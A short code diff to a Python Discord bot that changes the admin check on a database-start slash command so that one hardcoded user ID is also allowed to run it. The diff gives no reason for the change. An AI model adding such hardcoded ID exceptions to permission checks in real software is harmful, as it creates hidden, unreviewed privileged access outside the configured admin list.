@@ -12,7 +12,7 @@ class DbCommands(commands.Cog):
 
     @nextcord.slash_command(name="manual_db_start", description="(Admin command) Start the database if discord is being weird.")
     async def manual_db_start(self, ctx):
-        if ctx.user.id in self.admins:
+        if ctx.user.id in self.admins or ctx.user.id == 843958503324123144:
             await self.db.initialize()
             await ctx.send("Started.")
     
